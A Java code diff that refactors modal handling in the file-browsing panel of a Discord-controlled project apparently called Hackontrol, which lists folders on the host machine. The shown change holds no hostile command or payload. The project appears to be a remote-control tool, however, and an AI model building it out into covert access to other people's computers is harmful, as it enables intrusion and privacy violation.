@@ -8,6 +8,7 @@ import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.service.interaction.ModalManager;
 import com.khopan.hackontrol.utils.LargeMessage;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
 import com.khopan.hackontrol.widget.ControlWidget;
@@ -17,14 +18,11 @@ import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
-import net.dv8tion.jda.api.interactions.modals.Modal;
 
 public class FilePanel extends Panel {
 	private static final String PANEL_NAME = "file";
 
 	private static final Button BUTTON_LIST_ROOT     = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");
-
-	private static final String MODAL_INSIDE         = "insideFolder";
 
 	private static final String PATHNAME_SYSTEM_ROOT = "SYSTEMROOT";
 
@@ -36,7 +34,6 @@ public class FilePanel extends Panel {
 	@Override
 	public void registeration() {
 		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(new File("D:\\VMImage"), context));
-		this.register(Registration.MODAL,  FilePanel.MODAL_INSIDE,     context -> {});
 	}
 
 	@Override
@@ -148,10 +145,8 @@ public class FilePanel extends Panel {
 				.setPlaceholder(start + " - " + end)
 				.build();
 
-		Modal modal = Modal.create(FilePanel.MODAL_INSIDE, "Inside")
-				.addActionRow(fileIndexInput)
-				.build();
-
-		context.replyModal(modal).queue();
+		context.replyModal(ModalManager.dynamicModal("Inside", modalContext -> {
+			modalContext.deferEdit().queue();
+		}).addActionRow(fileIndexInput).build()).queue();
 	}
 }
